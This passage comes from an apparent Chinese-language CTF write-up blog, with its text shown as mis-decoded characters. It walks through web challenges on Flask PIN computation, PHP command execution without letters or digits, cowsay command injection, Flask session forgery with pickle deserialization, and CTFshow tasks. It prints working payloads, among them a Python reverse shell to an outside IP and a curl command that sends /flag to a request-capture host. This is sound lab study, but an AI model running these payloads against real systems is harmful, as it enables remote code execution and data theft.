class="hljs go"><span class="hljs-comment">//file.goï¼Œè¿™é‡Œå®ç°äº†ä¸Šä¼ å’Œè§£å‹åŠŸèƒ½</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">UploadFile</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, FileResponse&#123;<br>Code:    http.StatusBadRequest,<br>Message: <span class="hljs-string">&quot;No file uploaded&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>ext := filepath.Ext(file.Filename)<br><span class="hljs-keyword">if</span> (ext != <span class="hljs-string">&quot;.zip&quot;</span>) || (file.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>) != <span class="hljs-string">&quot;application/zip&quot;</span>) &#123;<br>c.JSON(http.StatusBadRequest, FileResponse&#123;<br>Code:    http.StatusBadRequest,<br>Message: <span class="hljs-string">&quot;Only .zip files are allowed&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">UnzipPackage</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>files, err := filepath.Glob(<span class="hljs-string">&quot;/app/uploads/*.zip&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to get list of .zip files&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> files &#123;<br>cmd := exec.Command(<span class="hljs-string">&quot;unzip&quot;</span>, <span class="hljs-string">&quot;-o&quot;</span>, file, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">&quot;/tmp/&quot;</span>)<br><span class="hljs-keyword">if</span> err := cmd.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to unzip file: &quot;</span> + file,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">//ç™»å½•åçš„/api/secretè·¯ç”±ä¸‹å­˜åœ¨è¯»å–æ–‡ä»¶çš„åŠŸèƒ½ï¼š</span><br>    <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadSecretFile</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>secretFilepath := <span class="hljs-string">&quot;/app/secret&quot;</span><br>content, err := util.ReadFileToString(secretFilepath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to read secret file&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>secretContent, err := util.ReadFileToString(content)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to read secret file content&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åªæ£€æŸ¥äº†æ–‡ä»¶çš„<code>content-type</code>å’Œæœ€åä¸€ä¸ª<code>.</code>åæ˜¯å¦ä¸º<code>zip</code>ã€‚ç„¶åä¼šæŠŠè¿™ä¸ªæ–‡ä»¶è§£å‹åˆ°<code>/tmp</code>ç›®å½•ä¸‹ã€‚åé¢åº”è¯¥æ˜¯åˆ©ç”¨è½¯é“¾æ¥å’Œ<code>secret</code>è·¯ç”±è§£é¢˜ï¼Œä½†æ˜¯ä¸å¤ªä¼šåšğŸ˜µ</p><h2 id="web801"><a href="#web801" class="headerlink" title="web801"></a>web801</h2><p><code>flask</code>ç®—<code>Pin</code>ï¼Œå•çº¯è€ƒè¿™ä¸ªä¸œè¥¿çš„è¿˜æ˜¯æŒºå°‘ã€‚ä¹‹å‰åšè¿‡æŠŠ<code>SSTI</code>æˆ–<code>XXE</code>å’Œè¿™ä¸œè¥¿æ‹¼åˆ°ä¸€èµ·çš„é¢˜(å…¶å®ä¸»è¦å°±æ˜¯åˆ©ç”¨æŸäº›æ–¹å¼å»è¯»ç®—PINéœ€è¦çš„æ–‡ä»¶ï¼Œç®—å®Œäº†å°±èƒ½æ‰§è¡Œå‘½ä»¤å•¥çš„)ã€‚</p><p><a href="https://xz.aliyun.com/t/8092#toc-2">å‚è€ƒèµ„æ–™</a></p><p><code>/file?filenname=</code>å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œç„¶åç…§ç€æ–‡ç« é‡Œéœ€è¦çš„æ–‡ä»¶è¯»å®Œè·‘ä¸ªè„šæœ¬å°±è¡Œ(æ–°æ—§ç‰ˆæœ¬ä¸åŒï¼Œç‰ˆæœ¬æ ¹æ®æŠ¥é”™èƒ½å‡º)ã€‚</p><h2 id="web802"><a href="#web802" class="headerlink" title="web802"></a>web802</h2><p>æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œã€‚<a href="https://xz.aliyun.com/t/8107?time__1311=n4+xuDgDBDyGD=DOFD/D0ioQLR7xcQrD7w2vD&alichlgref=https://www.google.com/">å‚è€ƒèµ„æ–™</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">å‚è€ƒèµ„æ–™</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦å°±ä¸‰ç§æ–¹æ³•ï¼šå¼‚æˆ–ã€å–åå’Œè‡ªå¢ã€‚</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">cmd=$_=(_/_._)[_];$_%2b%2b;$%FA=$_.$_%2b%2b;$_%2b%2b;$_%2b%2b;$_=_.$%FA.%2b%2b$_.%2b%2b$_;$$_[_]($$_[%FA]);&amp;_=<span class="hljs-keyword">system</span>&amp;%FA=cat f*<br>æˆ–è€…ï¼š<br>(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D5);<br></code></pre></td></tr></table></figure><h2 id="HGAME-What-the-cow-say"><a href="#HGAME-What-the-cow-say" class="headerlink" title="[HGAME]What the cow say?"></a>[HGAME]What the cow say?</h2><p>é¡µé¢åŠŸèƒ½å°±æ˜¯è¾“å…¥å•¥è¿™ä¸ªç‰›å°±ä¼šè¯´å•¥ï¼š</p><p><img src="/img/cowsaywhat1.png" alt="cowsaywhat1"></p><p>å•ç‹¬ä¸€ä¸ª<code>&#39;</code>ä¼šæŠ¥é”™ï¼Œ<code>&#39;&#39;</code>ç›´æ¥è¢«æ›¿æ¢æˆç©ºã€‚<code>;</code>ï¼Œ<code>&amp;</code>ï¼Œ<code>|</code>ç›´æ¥è§¦å‘wafã€‚</p><p>å¤šå‘½ä»¤æ‰§è¡Œçš„è¯ä¹Ÿå¯ä»¥ç”¨<code>%0a</code>:</p><p><code>%0als /</code>:</p><p><img src="/img/cowsaywhat3.png" alt="cowsaywhat3"></p><p>ä»–åº•ä¸‹è¿˜æœ‰ä¸ª<code>flag_c0w54y</code>æ–‡ä»¶ï¼Œç„¶åè¿‡æ»¤äº†<code>flag</code>å…³é”®å­—ç”¨<code>fla?</code>æ›¿æ¢ï¼Œè¿‡æ»¤äº†<code>cat</code>ç”¨<code>more</code>æ›¿æ¢ï¼š</p><p><code>%0amore /fla?_is_here/fla?_c0w54y</code></p><p><img src="/img/cowsaywhat4.png" alt="cowsaywhat4"></p><h2 id="HGAME-myflask"><a href="#HGAME-myflask" class="headerlink" title="[HGAME]myflask"></a>[HGAME]myflask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezone<br><br>currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br><br>app = Flask(__name__)<br><span class="hljs-comment"># Tips: Try to crack this first â†“</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<br><span class="hljs-built_in">print</span>(currentTime)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <br>    <span class="hljs-comment"># For POST requests from admin</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>        <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>        userdata=pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> userdata<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>session</code>ä¼ªé€ +<code>pickle</code>ååºåˆ—åŒ–</p><p>æŠ“åŒ…çœ‹<code>session</code>ï¼Œå…ˆæŠŠè¿™ä¸ª<code>secret_key</code>ç ´è§£ï¼š</p><p>è¿™ä¸ªä¸œè¥¿å…¶å®å°±æ˜¯ç”¨å…­ä½æ•°è¡¨ç¤º<code>å°æ—¶åˆ†é’Ÿç§’æ•°</code>ï¼Œç›´æ¥çˆ†ç ´å°±è¡Œã€‚</p><p>ç„¶åå°±æ˜¯<code>session</code>ä¼ªé€ ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">flask-unsign --unsign --cookie <span class="hljs-string">&#x27;sessionçš„å€¼&#x27;</span> --wordlist /home/viper3/æ¡Œé¢/output.txt --no-literal-eval<br>//ç»“æœï¼šb<span class="hljs-string">&#x27;102921&#x27;</span><br>flask-unsign --sign --cookie <span class="hljs-string">&quot;&#123;&#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span> --secret <span class="hljs-string">&#x27;102921&#x27;</span> --no-literal-eval<br></code></pre></td></tr></table></figure><p>å¯ä»¥éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="/img/myflaskhgame.png" alt="myflaskhgame"></p><p>æˆåŠŸä»¥adminèº«ä»½ç™»å½•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯RCEäº†ï¼š</p><p>éœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯pythonç‰ˆæœ¬è¦ç”¨3ï¼Œç„¶åwindowså’Œlinuxä¸‹ç”Ÿæˆçš„payloadæ˜¯ä¸åŒçš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;43.129.237.123&quot;,9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> os.system, (s,)<br><br><br>a = A()<br><span class="hljs-built_in">print</span>((pickle.dumps(a)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;----------------&#x27;</span>)<br>pickle_data = pickle.dumps(a)<br>user = base64.b64encode(pickle_data).decode()<br><span class="hljs-built_in">print</span>(user)<br>pickle.loads(base64.b64decode(user))<br></code></pre></td></tr></table></figure><p>è¯•äº†ä¸¤ç§æ–¹æ³•éƒ½ä¸æˆåŠŸ:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl -X POST --data \&quot;`cat /flag`\&quot; http://tscf5b3d.requestrepo.com&#x27;)&quot;</span>,))<br><br><br>a = A()<br><span class="hljs-built_in">print</span>((pickle.dumps(a)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;----------------&#x27;</span>)<br>pickle_data = pickle.dumps(a)<br>user = base64.b64encode(pickle_data).decode() <span class="hljs-comment">#base64åŠ å¯†åçš„æ•°æ®</span><br><span class="hljs-built_in">print</span>(user)<br>pickle.loads(base64.b64decode(user))<br></code></pre></td></tr></table></figure><p>æ²¡ç»“æœ:(ç­‰wpå‡ºæ¥çœ‹çœ‹ğŸ‘€</p><h2 id="HGAME-Select-More-Courses"><a href="#HGAME-Select-More-Courses" class="headerlink" title="[HGAME]Select More Courses"></a>[HGAME]Select More Courses</h2><p>å¯†ç å¼±å£ä»¤ï¼Œæ‰¾ä¸ªtop1000çˆ†ç ´ä¸€ä¸‹å°±è¡Œï¼š</p><p><img src="/img/selectmore1.png" alt="selectmore1"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">qwert123<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯è¿™é¢˜çš„é€»è¾‘ï¼šéœ€è¦æŠŠ<code>åˆ›ä¸šåŸºç¡€</code>è¿™é—¨è¯¾é€‰ä¸Šï¼Œä¸è¿‡å­¦åˆ†æ»¡äº†éœ€è¦æ‰©å­¦åˆ†(æ‰©å­¦åˆ†è¦æ±‚ç»©ç‚¹3.5ï¼Œå½“å‰ç»©ç‚¹åªæœ‰3)ï¼Œéœ€è¦æ‰©å®Œå­¦åˆ†å†å»æŠ¢è¯¾ã€‚</p><p><code>/expand</code>è·¯ç”±ç»™äº†æç¤ºè¯´<code>Race against time</code>(åˆ©ç”¨æ¡ä»¶ç«äº‰)ã€‚ä½†è¿˜æ˜¯æ²¡å•¥æ€è·¯ğŸ‘€ç­‰wpå‡ºæ¥çœ‹çœ‹</p><h2 id="CTFshow-éƒ¨åˆ†ï¼š"><a href="#CTFshow-éƒ¨åˆ†ï¼š" class="headerlink" title="[CTFshow]éƒ¨åˆ†ï¼š"></a>[CTFshow]éƒ¨åˆ†ï¼š</h2><h3 id="CTFShow-å‘½ä»¤æ‰§è¡Œ-web40"><a href="#CTFShow-å‘½ä»¤æ‰§è¡Œ-web40" class="headerlink" title="[CTFShow å‘½ä»¤æ‰§è¡Œ]web40"></a>[CTFShow å‘½ä»¤æ‰§è¡Œ]web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å‡ ä¹æŠŠèƒ½è¿‡æ»¤çš„ç¬¦å·éƒ½è¿‡æ»¤äº†ã€‚ã€‚</p><p><a href="https://xiaofeiji-77.github.io/2021/08/22/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87/">å‚è€ƒèµ„æ–™-æ— å‚RCE</a></p><ul><li>åˆ©ç”¨var_dump(scandir(â€˜.â€™));æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å</li><li>localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œæ•°ç»„ç¬¬ä¸€é¡¹æ˜¯<code>.</code></li><li>current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</li></ul><p>ç»¼ä¸Šï¼Œæ„é€ &#x2F;<code>?c=var_dump(scandir(current(localeconv()));</code>å³å¯æŸ¥çœ‹å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶é¡ºåºã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;flag.php&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>ç›®æ ‡æ˜¯å€’æ•°ç¬¬äºŒé¡¹ï¼Œç›´æ¥:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><h3 id="CTFshow-nodejs-web334"><a href="#CTFshow-nodejs-web334" class="headerlink" title="[CTFshow nodejs]web334"></a>[CTFshow nodejs]web334</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//login.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> users = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../modules/user&#x27;</span>).<span class="hljs-property">items</span>;<br> <br><span class="hljs-keyword">var</span> findUser = <span class="hljs-keyword">function</span>(<span class="hljs-params">name, password</span>)&#123;<br>  <span class="hljs-keyword">return</span> users.<span class="hljs-title function_">find</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">item</span>)&#123;<br>    <span class="hljs-keyword">return</span> name!==<span class="hljs-string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="hljs-property">username</span> === name.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; item.<span class="hljs-property">password</span> === password;<br>  &#125;);<br>&#125;;<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">var</span> user = <span class="hljs-title function_">findUser</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>, req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>);<br> <br>  <span class="hljs-keyword">if</span>(user)&#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-title function_">regenerate</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) &#123;<br>      <span class="hljs-keyword">if</span>(err)&#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);        <br>      &#125;<br>       <br>      req.<span class="hljs-property">session</span>.<span class="hljs-property">loginUser</span> = user.<span class="hljs-property">username</span>;<br>      res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>,<span class="hljs-attr">ret_flag</span>:flag&#125;);              <br>    &#125;);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;è´¦å·æˆ–å¯†ç é”™è¯¯&#x27;</span>&#125;);<br>  &#125;  <br>  <br>&#125;);<br><span class="hljs-comment">//user.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">items</span>: [<br>    &#123;<span class="hljs-attr">username</span>: <span class="hljs-string">&#x27;CTFSHOW&#x27;</span>, <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;123456&#x27;</span>&#125;<br>  ]<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>user.js</code>ç»™äº†ç”¨æˆ·åå’Œå¯†ç ï¼Œä½†<code>login.js</code>å¯¹ç™»å½•è¿›è¡Œäº†é™åˆ¶ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> findUser = <span class="hljs-keyword">function</span>(<span class="hljs-params">name, password</span>)&#123;<br>  <span class="hljs-keyword">return</span> users.<span class="hljs-title function_">find</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">item</span>)&#123;<br>    <span class="hljs-keyword">return</span> name!==<span class="hljs-string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="hljs-property">username</span> === name.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; item.<span class="hljs-property">password</span> === password;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥<code>ctfshow</code>å¯†ç 